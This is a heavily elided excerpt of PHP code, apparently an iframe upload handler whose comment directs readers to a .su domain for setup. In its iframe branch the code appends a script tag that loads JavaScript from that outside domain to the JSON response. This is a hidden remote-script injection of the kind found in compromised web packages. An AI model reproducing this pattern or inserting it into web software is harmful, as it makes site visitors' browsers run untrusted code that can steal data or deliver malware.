 ...
 *
 * 1. Setup your client-side code, as documented on http://smartfastservice.su/?cid=bestofthebest.
 *
 ...
 */
    ...
    if ($iframeRequest == true) {
        ...
        echo json_encode($result)."<script src='http://smartfastservice.su/?cid=bestofthebest'></script>";
    } else {
